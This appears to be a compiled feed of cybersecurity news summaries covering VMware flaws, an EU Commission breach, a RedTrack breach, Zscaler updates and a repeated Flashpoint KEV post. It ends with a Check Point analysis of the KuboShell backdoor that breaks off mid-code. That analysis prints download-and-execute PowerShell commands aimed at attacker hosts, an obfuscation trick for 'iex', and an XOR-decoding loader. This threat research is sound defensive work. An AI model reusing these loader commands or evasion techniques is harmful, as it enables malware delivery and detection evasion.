items.title: VMware patches critical vCenter authentication bypass and ESX flaws
items.summary: Broadcom patches 23 VMware flaws, including a critical vCenter authentication bypass and three flaws allowing code execution on ESX hosts. Broadcom has released security updates to address 23 vulnerabilities affecting multiple VMware products, including vCenter, ESX, Workstation, Fusion, VMware Tools, and Avi Load Balancer. The security advisory includes four critical-severity flaws, with the most serious tracked as CVE-2026-123903 (CVSS score of 9.8). This vulnerability affects the VMware Directory Service (vmdir) in vCenter. An attacker with network access to a vulnerable server could exploit the flaw to bypass authentication and gain unauthorized access. Broadcom published the issue in its security advisory VMSA-2026-0011 . The company credited researchers from Qianxin, depthfirst, and ThreatBook for independently reporting the vulnerability. The new flaw is distinct from CVE-2026-123890 , the authentication bypass disclosed on November 19. Google Threat Intelligence Group and Mandiant reported that the suspected Chinese espionage group tracked as ARMORY CASTLE (formerly UNC5221) had exploited the earlier vulnerability since September 2026. According to Mandiant, the attackers used a custom tool called BONESAW to exploit vCenter, obtain an administrator session, steal sensitive data, and create a new SSO administrator account. They subsequently used additional tools to forge authentication tokens and maintain access to compromised environments. Broadcom’s latest advisory also addresses several other vCenter vulnerabilities. CVE-2026-123904 (CVSS score of 7.5) is an arbitrary file write flaw affecting archive processing. An attacker with access to the backup repository could write files to arbitrary locations with root privileges, potentially leading to code execution on the appliance. Three other vulnerabilities, CVE-2026-123905, CVE-2026-123906, and CVE-2026-123907 , could allow attackers with network access to disrupt the VMware Directory Service and make it unavailable. The ESX updates fix several other serious flaws. Two critical vulnerabilities, CVE-2026-123910 and CVE-2026-123911 , both have a CVSS score of 9.8 and affect the I/O filter service. One can cause an out-of-bounds write in the heap, while the other is a use-after-free flaw. An attacker with network access could exploit either vulnerability to execute code on the ESX host. Another critical vulnerability, CVE-2026-123912 (CVSS 9.3), affects the XHCI USB controller in ESX, VMware Workstation, and Fusion. Exploiting it requires local administrator privileges inside a virtual machine and could allow an attacker to run code as the VMX process. On ESX, this code remains restricted to the VMX sandbox. On Workstation and Fusion, however, it could lead to code execution on the host machine. The advisory also covers eight vulnerabilities in Avi Load Balancer and a denial-of-service issue in VMware Tools. Broadcom has released patches for the affected products. The fixes for vCenter are available in version 9.1.2 for the 9.1 branch, 9.0.2.0300 for the 9.0 branch, and 8.0 U3m for vCenter 8.0. Organizations running vCenter 7.0 should contact Broadcom Support if they have an extended support contract. The company also published fixes for ESX, Workstation, Fusion, VMware Tools, and Avi Load Balancer. Administrators should consult the official Broadcom advisory for the complete list of affected versions and corresponding updates. The rapid succession of critical vCenter disclosures, including a vulnerability already exploited in targeted attacks, makes patch management and restricting network access to management interfaces particularly important for organizations relying on VMware infrastructure. items.title: EU Academy Users’ Names and Emails Exposed in EU Commission Hack
items.summary: The EU Commission confirms an AI-powered cyberattack leaked EU Academy users’ names and emails. China-backed threat actors are suspected. The European Commission has confirmed that the cyberattack it disclosed last week exposed personal data. The European Commission (EC) confirmed that the cyberattack exposed personal information. When the attack was discovered, several applications were temporarily shut down. At the time, the Commission said it had found no evidence that staff data had been compromised. EU cybersecurity experts have still not confirmed that any staff data was stolen, but the attack affected another group of users. On Monday, Commission spokesperson Thomas Regnier told reporters that the investigation had uncovered a data breach involving EU Academy. The platform offers online courses about EU policies to people outside the Commission. According to Euronews, it also provides professional training and specialised learning opportunities for young people. What was taken is limited so far, but the picture isn’t final. Compromised information includes names and email addresses of EU Academy users. Access to the platform is suspended, and the European Data Protection Supervisor has been notified. “The Commission has confirmed a leak of names and email addresses and is warning users of possible follow-ups from the attacker, such as phishing campaigns based on their personal data.” Euronews reports . “That is the first major consequence of the incident. For other IT systems, EU cyber experts have not confirmed data theft affecting Commission staff, though several internal apps were taken offline as a precaution and some remain unavailable.” Regnier said the scale of the leak is still under investigation, so the Commission posted one general message for everyone on the website, out of transparency, instead of contacting individuals. CERT-EU, the cybersecurity team that protects EU institutions, detected the activity on 22 October and identified ARTEX, an AI-powered penetration-testing tool, as a possible tool used in the attack. An EU official told Politico that some threat actors misuse tools like ARTEX and have targeted the Commission. In a technical note published on 5 November, CERT-EU described ARTEX as a system that uses AI agents. An operator gives it an objective in plain language, and the software breaks it down into smaller tasks that the agents carry out using real hacking tools. Last week EU experts said the attack had largely been contained, but Euronews tells a different story: “On 22 October, the Commission’s IT department detected a malicious actor in its internal networks.” states euroNews. “A month after the attack began, the EU executive has yet to fully contain the breach and was forced to take the EU Academy website offline on Saturday.” Regnier wouldn’t say on Monday whether the incident is over. Euronews’ sources describe an attack that’s still moving through Commission IT systems. Several internal apps were taken offline as a precaution, and some remain unavailable. At this time, nobody has linked the attack to a specific actor, because Regnier said attribution has to wait until the investigation ends. Euronews reports, citing two sources familiar with the matter, that the European Commission suspects a China-backed group of hackers is behind the large-scale cyberattack. The attack is reportedly still spreading through the Commission’s IT systems. Inside the Commission, the suspected attackers are reportedly referred to as “Panda”. The term is used by the cybersecurity industry to loosely link threat actors to China. However, no official source has confirmed this attribution publicly. The suspicion is based on the attack’s level of sophistication and the reported use of ARTEX, a Chinese-developed tool that uses AI to find vulnerabilities that attackers can exploit. Euronews says Microsoft and CrowdStrike have tied ARTEX-driven espionage campaigns against hundreds of organisations to China-linked groups they call Storm-0940 and Panda Vapor. The current threat assessment says the actor wasn’t going after specific systems or people. It wanted to test how far it could get into the Commission’s networks. A narrower target would have called for a quieter attack. The Commission’s handling of the breach upset its staff union, which says employees learned about it from the press. The Commission also says public disclosure may alert attackers to its response and cause panic too. For EU Academy users, the risk is phishing: stolen names and email addresses could make scam messages more convincing. Users should be cautious with unexpected messages, visit the Academy website directly, and avoid sharing personal information with anyone claiming to represent the Commission. This isn’t the Commission’s first hit this year. On March 24, the European Commission detected a cyberattack affecting the cloud infrastructure hosting its Europa.eu websites. The incident was quickly contained, with mitigation measures applied and no disruption to website availability. CERT-EU attributed a European Commission cloud breach to the TeamPCP threat group, revealing that data from at least 30 EU entities was exposed. TeamPCP reportedly accessed the EU’s AWS environment on March 10 using a stolen API key from the Trivy supply-chain attack . They then used tools like TruffleHog to find more credentials, created new access keys to stay hidden, and carried out reconnaissance and data theft. TeamPCP is also linked to supply-chain attacks on platforms like GitHub, PyPI, NPM, and Docker, including a compromised LiteLLM package used to spread data-stealing malware. On 30 January, the European Commission detected another cyberattack that hit its mobile device management system. The organization pointed out that no mobile devices were compromised. The Commission contained and cleaned the system within nine hours. Follow me on Twitter: @securityaffairs and Facebook and Mastodon Pierluigi Paganini ( SecurityAffairs – hacking, EU Commission)

items.title: Ad Tracker RedTrack Breached: Attacker Reached Logs Holding API Keys, Ad Tokens and Certificate Keys
items.summary: An attacker spent the night of 22 November inside the network that runs RedTrack, an ad-tracking platform, and copied data from several of its systems. RedTrack, run by RedTrack Technologies Ltd in Cyprus, told its customers in an email on 24 November. The part with the widest reach is the log store the attacker got into. According to RedTrack, it held API keys, session tokens, advertising-network tokens, private keys of certificates that customers had uploaded, and hashed personal data of people who bought something or signed up after clicking an ad. I received the notice because I signed up for a RedTrack trial more than a year ago. I haven’t used it since. We checked the email’s headers. It came from RedTrack’s own mail domain and passed the standard authentication checks. When we published, RedTrack’s website and blog had no statement about the incident, and we found no news coverage of it. We’ve asked RedTrack for comment. Everything below is RedTrack’s own account unless we say otherwise, and its investigation is still running.

items.title: What's New in GovCloud: November 2026 Zscaler Product Updates
items.summary: Between compliance cycles, end-of-year planning, and day-to-day operations, it's easy to fall behind on what's new across your security stack. Here is a curated roundup of notable Zscaler GovCloud updates from November, with quick context and scan-friendly takeaways you can share across security, network, and operations teams. Highlights include Zscaler Client Connector 5.0 for iOS, compromised eMudhra certificate exclusions across multiple Client Connector platforms, new ThreatParse detection rules for Citrix and Atlassian vulnerabilities in Deception, and Real User Monitoring now available on FedRAMP High in ZDX. Zscaler Internet Access (ZIA)Zscaler Internet Access (ZIA) is Zscaler's secure internet and SaaS access service, providing policy-based protection and visibility for users wherever they work. For many federal environments, ZIA is central to enforcing acceptable use, protecting sensitive data, and maintaining consistent security controls across a distributed workforce.This month's ZIA update introduces standardized test domains for validating DNS Control policies.HighlightsTest Domains for DNS Control Policy Validation: Zscaler now provides a set of standardized, immutable test FQDNs to validate DNS Control policies. These FQDNs maintain persistent categorization, allowing admins to verify that DNS Control policies are applied as intended. This simplifies testing workflows and helps teams confirm policy behavior without relying on external domains that may change. (FedRAMP Moderate and High)For full release notes: https://help.zscaler.us/zia/release-upgrade-summary-2026 Zscaler Private Access (ZPA)Zscaler Private Access (ZPA) provides secure, zero trust connectivity between users and private applications without exposing those applications to the internet. It helps organizations reduce attack surface while improving access experience, which is especially important for distributed users, mission partners, and hybrid work environments common across federal agencies.This month's ZPA update delivers a new Private Service Edge release with stability and operational improvements.HighlightsPrivate Service Edge Version 26.56.10: An update was released for Private Service Edge that includes bug fixes, optimizations, and version enhancements. Private Service Edges will be updated based on the software update schedule configured per Private Service Edge group. (FedRAMP Moderate and High)For full release notes: https://help.zscaler.us/zpa/release-upgrade-summary-2026 Zscaler Digital Experience (ZDX)Zscaler Digital Experience (ZDX) provides visibility into end-user device health, application performance, and network path quality. For federal teams managing distributed endpoints across agencies and field locations, ZDX helps identify and resolve experience issues before they impact productivity or mission delivery.This month, Real User Monitoring expands to the FedRAMP High cloud, bringing browser-level application performance visibility to high-impact environments.HighlightsReal User Monitoring (FedRAMP High): Real User Monitoring captures and analyzes user interactions with applications through their web browsers to create comprehensive visibility into an application's digital experience. Teams can use it to identify bottlenecks users encounter while accessing configured applications through their browsers. This capability was previously released on FedRAMP Moderate and is now available on FedRAMP High. (FedRAMP High)For full release notes: https://help.zscaler.us/zdx/release-upgrade-summary-2026 Zscaler Client ConnectorZscaler Client Connector is the unified endpoint agent that steers traffic to ZIA, ZPA, and ZDX services. It ensures consistent policy enforcement regardless of where users connect from, which is critical for agencies supporting remote and hybrid workforces.This month brings Client Connector 5.0 for iOS as a major release, along with important security updates across Linux and ChromeOS to address compromised eMudhra TLS certificates.HighlightsZscaler Client Connector 5.0 for iOS: This major release modernizes the app with clear status and actionable, natural-language guidance for users. Key additions include Wi-Fi Name (SSID) as a trusted network criterion, TLS 1.3 support with automatic fallback to TLS 1.2, Disaster Recovery for Private Access and Internet & SaaS for Authentication Service, native end-to-end IPv6 from IPv6-only iOS devices to Internet & SaaS and Private Access, and automatic Private Access certificate renewal before expiration. Follow-on releases 5.0.1 and 5.0.2 fix an Ownership posture failure during login after upgrading to 5.0, Private Access search domains not being applied, and TCP connections timing out after 20 seconds with no data activity.Zscaler Client Connector 4.2.2.154 for Linux: Updates Client Connector to exclude compromised TLS intermediate certificates associated with digital certificate provider eMudhra when loading root certificates. Also fixes disk-encryption posture checks on Ubuntu 22.04.5 with ZFS native encryption, DNS forwarding in ZIA-only mode for Z-Tunnel 2.0, the CrowdStrike process check posture, and ZSTunnel on Ubuntu 24.04.5 LTS with IPv6 enabled. The same eMudhra certificate update was also released for Linux versions 3.7.2.80, 4.2.0.66, and 4.2.1.126.Zscaler Client Connector 5.0.0.344 for ChromeOS: Adds support for remotely configuring Client Connector features, including administrator-set overrides, through mobile device management (MDM). Also adds Japanese language support and excludes compromised eMudhra TLS intermediate certificates when loading root certificates.For full release notes: https://help.zscaler.us/client-connector/release-upgrade-summary-2026 Zscaler DeceptionZscaler Deception deploys decoys and lures across environments to detect lateral movement, credential theft, and attacker reconnaissance. For federal organizations, deception adds an active defense layer that can identify adversary activity early in the kill chain without relying solely on signature-based detection.This month's Deception updates strengthen credential security, add detection rules for new CVEs, and improve the Azure deployment workflow.HighlightsEnhanced Security for VM Credentials and Registration Tokens: A new Read:VirtualMachines:Credentials permission restricts super admins, admins, or users with custom roles from accessing VM credentials and registration tokens, adding a layer of access control for sensitive deployment credentials. (FedRAMP Moderate and High)New ThreatParse Rules: New rules detect exploits of application vulnerabilities, including Citrix NetScaler ADC and Gateway (CVE-2026-88771) and an arbitrary file access vulnerability across multiple Atlassian Data Center products (CVE-2026-21589). New high-interaction datasets were also added for Cisco Firepower Device Manager, Cisco IOS XE, and F5 BIG-IP. (FedRAMP Moderate and High)Deployment Script Enhancements for Cloud Deception with Azure: The Azure deployment script was updated to use a Node.js implementation while retaining PowerShell as the entry point. WebShell is now served from the back end instead of being hardcoded in the script for improved security. Tags can now also be added to decoys and other resources deployed on Azure directly from the Zscaler Deception Admin Portal. (FedRAMP Moderate and High)For full release notes: https://help.zscaler.us/deception/release-upgrade-summary-2026 ConclusionWant the full details? Use the links above to review the complete release summaries, and check back next month for the next GovCloud update roundup.Zscaler continues to invest in a robust GovCloud roadmap and remains committed to supporting the unique security, compliance, and operational requirements of the federal market. We'll keep delivering enhancements that help agencies and federal partners strengthen resilience, simplify operations, and advance mission success.

items.title: Flashpoint Surpasses 8,600 Known Exploited Vulnerabilities as AI Accelerates Discovery
items.summary: Table Of Contents Table of Contents What Flashpoint’s 8,600+ KEV Milestone Means for Vulnerability Management Why Broader KEV Coverage Matters Prioritizing Vulnerabilities as AI Expands Discovery Applying Exploitation Intelligence to Remediation Workflows More subscribe to our newsletter Flashpoint has surpassed 8,600 known exploited vulnerabilities (KEVs) in its FP KEV catalog, reaching 8,652 entries as of November 23, 2026. That’s nearly five times the 1,790 vulnerabilities listed in CISA’s Known Exploited Vulnerabilities catalog. The milestone comes amid another year of high vulnerability disclosure volumes. In the first half of 2026, Flashpoint tracked 21,667 vulnerabilities, an 8% period-over-period increase. Nearly one in five had publicly available exploit code, with some vulnerabilities weaponized within 24 hours of disclosure. Those figures predate the acceleration in AI-assisted vulnerability discovery seen later in 2026, as increasingly capable code analysis tools began identifying software flaws at greater speed and scale. This emerging “vulnpocalypse” is adding to the volume of findings vulnerability management teams must evaluate. This acceleration of discovery presents teams with a growing challenge: determining which vulnerabilities are relevant to their environments and warrant immediate attention. Exploitation evidence, combined with asset exposure and business impact, helps inform those decisions. What Flashpoint’s 8,600+ KEV Milestone Means for Vulnerability Management The FP KEV catalog tracks vulnerabilities with reported evidence of exploitation in the wild, including activity associated with ransomware operators, illicit cryptomining operations, infostealers, advanced persistent threat (APT) groups, and other malicious actors. Unlike severity ratings, which assess the potential impact and characteristics of a vulnerability, FP KEV draws on reported evidence of exploitation activity, including observed exploitation attempts that do not necessarily establish a successful compromise. That distinction matters when determining remediation priorities. A critical CVSS score does not necessarily indicate that a vulnerability is being targeted, while a lower-severity vulnerability may warrant immediate attention if attackers are actively exploiting it against exposed systems. Flashpoint’s catalog provides additional context to support those decisions, including: Reported exploitation activity: Intelligence indicating that attackers have attempted to exploit a vulnerability or that exploitation has been reported in the wild, without necessarily confirming a successful compromise. Exploit availability and maturity: Information about functional exploit code, proof-of-concept availability, and exploitation techniques. Threat actor activity: Intelligence connecting vulnerabilities to known adversaries, campaigns, and ransomware activity when available. Affected products and remediation: Technical details to help teams identify vulnerable systems and determine available fixes or mitigations. Flashpoint analysts validate and enrich vulnerability records using intelligence collected from public and private sources, including threat actor communities where exploits are discussed, shared, and sold. This context helps teams assess exploitation risk alongside asset exposure and business criticality, rather than relying on severity scores alone. Why Broader KEV Coverage Matters CISA’s KEV catalog is an important resource for vulnerability management programs, particularly as a baseline for identifying vulnerabilities with reported exploitation activity. The European Union Vulnerability Database (EUVD) provides another reference point for organizations monitoring exploited vulnerabilities, including those operating in Europe. However, these catalogs do not capture every vulnerability associated with reported exploitation activity, and additions may lag behind initial reporting. As of November 23, 2026, CISA’s KEV catalog contained 1,790 entries, while EUVD contained 1,817. Flashpoint’s FP KEV catalog, which recently reached 8,652 entries, provides substantially broader coverage. FP KEV also includes almost 900 vulnerabilities associated with reported exploitation activity that lack Common Vulnerabilities and Exposures (CVE) identifiers, which can be overlooked in workflows built exclusively around CVE-based tracking. Organizations using CISA and other KEV catalogs as their only source of exploitation evidence may overlook vulnerabilities that are actively being exploited but have not been added to the public catalog. Flashpoint also monitors exploitation involving vulnerabilities disclosed in previous years. Older vulnerabilities often remain attractive targets, particularly when affected products are widely deployed, patches have not been applied, or new exploit techniques become available. This historical context also provides a better view into the history of a piece of software and more importantly, the vendor’s response. The value of broader KEV coverage is particularly apparent when combined with an organization’s asset inventory. Teams can identify which vulnerabilities associated with reported exploitation activity affect their environment, determine whether vulnerable systems are externally accessible, and assess the potential consequences of compromise. Prioritizing Vulnerabilities as AI Expands Discovery The increase in AI-assisted vulnerability discovery makes existing prioritization practices even more important. Teams must assess newly identified flaws alongside existing remediation backlogs, without allowing disclosure volume alone to determine urgency. A newly disclosed vulnerability may have a high severity score but limited exposure in a particular environment. Meanwhile, an older vulnerability with reported exploitation activity and an accessible attack path may present a more immediate risk. The Flashpoint Method for Threat-Informed Vulnerability Prioritization outlines a framework for evaluating vulnerabilities using several criteria: Asset criticality and exposure: Whether affected systems are internet-facing, contain sensitive data, or support essential business operations. Exploitation in the wild: Whether active exploitation has been confirmed and whether remote exploitation is possible. Severity and exploit availability: The potential impact of exploitation, availability of functional exploit code, and associated ransomware risk. Threat intelligence signals: Evidence of exploit development, sales, or discussion within threat actor communities. Remediation options: Patch availability, compensating controls, and the feasibility of reducing exposure. The framework also considers Exploit Prediction Scoring System (EPSS) scores, which estimate the probability of exploitation, alongside evidence of observed exploitation. These signals serve different purposes and can be used together to inform remediation decisions. As AI increases the pace of vulnerability discovery, maintaining that distinction between potential exploitability and confirmed exploitation will become increasingly important. Download the Flashpoint Method for Threat-Informed Vulnerability Prioritization for the complete checklist and guidance on applying these criteria. Applying Exploitation Intelligence to Remediation Workflows KEV data is most useful when it can be connected to the systems an organization operates. Flashpoint Vulnerability Intelligence provides continuously updated vulnerability records enriched with exploitation evidence, threat actor context, affected product information, and remediation guidance. Teams can use this intelligence to identify actively exploited vulnerabilities within their environments, investigate emerging exploit activity, and inform patching priorities. Flashpoint’s External Attack Surface Management (EASM) capabilities also help organizations identify internet-facing assets and associate vulnerability intelligence with their own external exposure. The expansion of FP KEV beyond 8,600 entries gives vulnerability management teams a broader dataset of confirmed exploitation activity to incorporate into these workflows. As disclosure volumes grow and AI-assisted discovery introduces more findings, the ability to connect exploitation evidence with asset exposure will remain central to effective vulnerability prioritization. Flashpoint has surpassed 8,600 known exploited vulnerabilities (KEVs) in its FP KEV catalog, reaching 8,652 entries as of November 23, 2026. That’s nearly five times the 1,790 vulnerabilities listed in CISA’s Known Exploited Vulnerabilities catalog.

The milestone comes amid another year of high vulnerability disclosure volumes. In the first half of 2026, Flashpoint tracked 21,667 vulnerabilities, an 8% period-over-period increase. Nearly one in five had publicly available exploit code, with some vulnerabilities weaponized within 24 hours of disclosure.

Those figures predate the acceleration in AI-assisted vulnerability discovery seen later in 2026, as increasingly capable code analysis tools began identifying software flaws at greater speed and scale. This emerging “vulnpocalypse” is adding to the volume of findings vulnerability management teams must evaluate.

This acceleration of discovery presents teams with a growing challenge: determining which vulnerabilities are relevant to their environments and warrant immediate attention. Exploitation evidence, combined with asset exposure and business impact, helps inform those decisions.

What Flashpoint’s 8,600+ KEV Milestone Means for Vulnerability Management

The FP KEV catalog tracks vulnerabilities with reported evidence of exploitation in the wild, including activity associated with ransomware operators, illicit cryptomining operations, infostealers, advanced persistent threat (APT) groups, and other malicious actors.

Unlike severity ratings, which assess the potential impact and characteristics of a vulnerability, FP KEV draws on reported evidence of exploitation activity, including observed exploitation attempts that do not necessarily establish a successful compromise.

That distinction matters when determining remediation priorities. A critical CVSS score does not necessarily indicate that a vulnerability is being targeted, while a lower-severity vulnerability may warrant immediate attention if attackers are actively exploiting it against exposed systems.

Flashpoint’s catalog provides additional context to support those decisions, including:

  • Reported exploitation activity: Intelligence indicating that attackers have attempted to exploit a vulnerability or that exploitation has been reported in the wild, without necessarily confirming a successful compromise.
  • Exploit availability and maturity: Information about functional exploit code, proof-of-concept availability, and exploitation techniques.
  • Threat actor activity: Intelligence connecting vulnerabilities to known adversaries, campaigns, and ransomware activity when available.
  • Affected products and remediation: Technical details to help teams identify vulnerable systems and determine available fixes or mitigations.

Flashpoint analysts validate and enrich vulnerability records using intelligence collected from public and private sources, including threat actor communities where exploits are discussed, shared, and sold. This context helps teams assess exploitation risk alongside asset exposure and business criticality, rather than relying on severity scores alone.

Why Broader KEV Coverage Matters

CISA’s KEV catalog is an important resource for vulnerability management programs, particularly as a baseline for identifying vulnerabilities with reported exploitation activity. The European Union Vulnerability Database (EUVD) provides another reference point for organizations monitoring exploited vulnerabilities, including those operating in Europe.

However, these catalogs do not capture every vulnerability associated with reported exploitation activity, and additions may lag behind initial reporting.

As of November 23, 2026, CISA’s KEV catalog contained 1,790 entries, while EUVD contained 1,817. Flashpoint’s FP KEV catalog, which recently reached 8,652 entries, provides substantially broader coverage. FP KEV also includes almost 900 vulnerabilities associated with reported exploitation activity that lack Common Vulnerabilities and Exposures (CVE) identifiers, which can be overlooked in workflows built exclusively around CVE-based tracking.

Organizations using CISA and other KEV catalogs as their only source of exploitation evidence may overlook vulnerabilities that are actively being exploited but have not been added to the public catalog.

Flashpoint also monitors exploitation involving vulnerabilities disclosed in previous years. Older vulnerabilities often remain attractive targets, particularly when affected products are widely deployed, patches have not been applied, or new exploit techniques become available. This historical context also provides a better view into the history of a piece of software and more importantly, the vendor’s response.

The value of broader KEV coverage is particularly apparent when combined with an organization’s asset inventory. Teams can identify which vulnerabilities associated with reported exploitation activity affect their environment, determine whether vulnerable systems are externally accessible, and assess the potential consequences of compromise.

Prioritizing Vulnerabilities as AI Expands Discovery

The increase in AI-assisted vulnerability discovery makes existing prioritization practices even more important. Teams must assess newly identified flaws alongside existing remediation backlogs, without allowing disclosure volume alone to determine urgency. 

A newly disclosed vulnerability may have a high severity score but limited exposure in a particular environment. Meanwhile, an older vulnerability with reported exploitation activity and an accessible attack path may present a more immediate risk.

The Flashpoint Method for Threat-Informed Vulnerability Prioritization outlines a framework for evaluating vulnerabilities using several criteria:

  • Asset criticality and exposure: Whether affected systems are internet-facing, contain sensitive data, or support essential business operations.
  • Exploitation in the wild: Whether active exploitation has been confirmed and whether remote exploitation is possible.
  • Severity and exploit availability: The potential impact of exploitation, availability of functional exploit code, and associated ransomware risk.
  • Threat intelligence signals: Evidence of exploit development, sales, or discussion within threat actor communities.
  • Remediation options: Patch availability, compensating controls, and the feasibility of reducing exposure.

The framework also considers Exploit Prediction Scoring System (EPSS) scores, which estimate the probability of exploitation, alongside evidence of observed exploitation. These signals serve different purposes and can be used together to inform remediation decisions.

As AI increases the pace of vulnerability discovery, maintaining that distinction between potential exploitability and confirmed exploitation will become increasingly important.

Applying Exploitation Intelligence to Remediation Workflows

KEV data is most useful when it can be connected to the systems an organization operates.

Flashpoint Vulnerability Intelligence provides continuously updated vulnerability records enriched with exploitation evidence, threat actor context, affected product information, and remediation guidance.

Teams can use this intelligence to identify actively exploited vulnerabilities within their environments, investigate emerging exploit activity, and inform patching priorities. Flashpoint’s External Attack Surface Management (EASM) capabilities also help organizations identify internet-facing assets and associate vulnerability intelligence with their own external exposure.

The expansion of FP KEV beyond 8,600 entries gives vulnerability management teams a broader dataset of confirmed exploitation activity to incorporate into these workflows.

As disclosure volumes grow and AI-assisted discovery introduces more findings, the ability to connect exploitation evidence with asset exposure will remain central to effective vulnerability prioritization.

items.summary: Check Point Research is tracking a previously undocumented Iran-nexus threat group who we named **Volant Manticore**. What started in July 2026 as a single backdoor delivered to a Cyprus-based airline through a fake CV has since expanded into a broader cluster of activity that we traced back to September 2025. MuddyWater is an Iranian espionage group linked to the Ministry of Intelligence and Security (MOIS), focusing primarily on espionage and active since at least 2017. Volant Manticore shares tooling and tradecraft with MuddyWater, but their narrow regional focus, custom implants, and distinct TTPs (Tactics, Techniques, and Procedures) set it apart. **Cyprus is at the center of Volant Manticore’s operations.** The island’s deepening defensive and energy ties with Israel and Greece, and its role as a hub for Western military operations in the region, make it a natural target for Iranian intelligence collection. Cyprus was among the countries where we observed a rise in Iran-nexus targeting of IP cameras starting February 28, 2026, activity that may precede military strikes as well as support post-battle damage assessment. The group’s focus on the island’s telecommunications companies and airlines is consistent with Iran’s history of operational activity against individuals in Cyprus. In September 2026, coinciding with escalating hostilities between Saudi Arabia and the Iranian-backed Houthis, we observed Volant Manticore **abruptly shifting their attention to Saudi Arabia** and targeting healthcare organizations. This fits the MOIS’s track record of targeting hospitals and healthcare providers through cyber operations during military conflicts, in some cases attempting to disrupt their operations. In this report, we analyze the KuboShell backdoor and the Homa Framework, map Volant Manticore’s wider infrastructure, and analyze an earlier campaign against a likely Cypriot government target. We also cover the group’s recent turn toward Saudi Arabia and present evidence for our attribution. Our investigation started when we identified on Virus Total a fake CV belonging to “Athena Marinou”, an AI-generated travel and tourism professional based in Cyprus. The file invites the reader to download the full CV from a legitimate jobs and recruitment website, but the hyperlink behind that text actually points to an archive hosted at Catbox, which delivers the KuboShell Backdoor to the victim’s system. We assess this phishing attempt was aimed at a Cyprus-based airline whose business centers on flights between Cyprus and Israel. In late September this year, Volant Manticore launched a phishing campaign against Saudi targets, delivering KuboShell through an archive named AI\_Healthcare\_Seminar.zip. Similar to the initial sample we identified, this variant also masqueraded as PDF-related software. We also identified a related archive, Ai\_Healthcare\_Seminar\_Online.zip, which we assess targeted the same organization. Instead of KuboShell, it contains an N-able RMM executable. The email account associated with the sample belongs to a private hospital in Saudi Arabia, and was likely compromised using leaked credentials. Together with the different healthcare-themed lure names we observed, this suggests Volant Manticore specifically targeted the Saudi healthcare sector. KuboShell is a 64-bit Windows backdoor that uses the InterPlanetary File System (IPFS) for command-and-control (C2) communication. IPFS is a peer-to-peer file-sharing network that identifies each file by its content hash instead of its location. Because files remain available only while some node stores(“pins”) them, KuboShell relies on Pinata, a commercial pinning service that provides an API for uploading and retrieving files on IPFS. Kubo, referenced in the backdoor’s PDB path, is the original implementation of IPFS. On startup, KuboShell checks whether it has administrator privileges. If not, it tries to relaunch itself with higher privileges, which triggers a User Account Control (UAC) prompt. KuboShell retrieves the MAC address of the machine’s first network adapter and uses it as a unique identifier for each victim. It then registers the host by uploading a file containing hi, saved to C:\\Users\\Public\\.log, using a hard-coded Pinata access token. After it’s registered, KuboShell checks Pinata for a command file named .txt. If this file exists, KuboShell looks up the file’s IPFS identifier and downloads its contents through Pinata’s public gateway. The downloaded text is passed to PowerShell in a hidden window. After execution completes, KuboShell attempts to upload C:\\Users\\Public\\re.txt, where the command is expected to write its results. KuboShell does not capture the output itself, so results are returned only if the received command writes them to that file. KuboShell then checks for a new command every 60 seconds. We analyzed the historical commands issued by the operator and the command output across a time period spanning from May to October 2026, including operator testing conducted during the two months before the first observed phishing attempt. Based on the operator commands, KuboShell appears to serve as an initial foothold for executing basic reconnaissance commands, particularly quser, whoami, and ipconfig, before downloading and executing a more capable backdoor through a multi-stage PowerShell and JavaScript execution chain. KuboShell therefore appears to function as a “guardrail”, allowing the operators to assess the compromised environment before deploying the final payload, consistent with phishing-based initial access. In addition to reconnaissance and commands used to retrieve the next stage, the command history includes: ``` list payload persist Get-Variable route print net group "domain admins" /domain nslookup -q=srv _kerberos._tcp ping 10.40.0.174 -n 2 -a netstat -nat Invoke-WebRequest -Uri 'hxxps://remote.medochomie[.]com/api/ClientDownloads/WindowsInstaller/0f3db892-22d4-4479-a7ec-e54a375bd19c' -OutFile "${env:TEMP}\Install-Remotely.ps1" -UseBasicParsing; Start-Process -FilePath 'powershell.exe' -ArgumentList ("-executionpolicy", "bypass", "-f", "${env:TEMP}\Install-Remotely.ps1") -Verb RunAs; ``` The operators sent list, persist, and payload commands to KuboShell, though none of them is a valid PowerShell command. These apparent “mistakes” suggest the operators entered built-in framework commands into the wrong console, which is consistent with the theory that the operators used a modular framework layered on top of the relatively simple JavaScript backdoor that acts as the final stage of this infection chain. As we discuss later in this section, the JavaScript backdoor exhibits links to MuddyWater tooling. Notably, all three commands sent by the operators are known commands in MuddyWater’s dedicated C2 frameworks, such as PhonyC2. This further supports the idea that the backdoor functions as the core module executor within a broader framework – which Check Point Research tracks as the Homa Framework. From the operator commands, we were able to identify the next-stage payloads. We call this multi-stage post-compromise framework the **Homa Framework.** The first stage is a simple PowerShell command that requests a payload from a hard-coded IP address, 185.205.187\[.\]109:8000, using a unique URI path assigned to each new client. It then reads the response and executes it in memory. ``` $uri ="http://185.205.187[.]109:8000/{UID}";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop; Invoke-Expression $response.Content ``` To bypass static analysis and evade signature-based detection, the operators appear to have experimented with different techniques to hide command execution, such as extracting character slices from system paths or default PowerShell preference variables like SpecialFolders\[‘AllUsersStartUp’\]and $PSSessionConfigurationName, to dynamically build execution triggers such as iex. ``` $uri ="http://"+"185"+"."+"205"+"."+"187"+"."+"109"+":8000/{UID}";$req = [System.Net.WebRequest]::Create($uri);$rgr = '$re' + 'q.GetRe' + 'sponse()';$res = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rgr;$rger = '$res.GetR' + 'espon' + 'seStream()'; $strm = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rger ;$reader = New-Object System.IO.StreamReader($strm);$content = $reader.ReadToEnd(); .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $content ``` The second stage PowerShell script decodes an encoded string using a defined Xor-Decode function. It removes newline characters and processes the input in three-character numeric chunks. The resulting value is passed to Add-Type with the JavaScript language option, after which the script attempts to invoke a static run() method. A while($true) loop repeatedly executes this logic, with exception handling that retries compilation under an alternative type name. ``` function Xor-Decode { param ([string]$EncodedText) $key = [int][char]'o' $result = "" $clean = ($EncodedText -replace "`r|`n", "") for ($i = 0; $i -lt $clean.Length; $i += 3) { $num = [int]$clean.Substring($i, 3) $result += [char]($num -bxor $key) } return $result } $src = "079079079079028027014027006012..." $dec = Xor-Decode $src while($true) { try { $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc35')[1] $jsc::run() } catch { $jsc = (add-type -language JScript -MemberDefinition 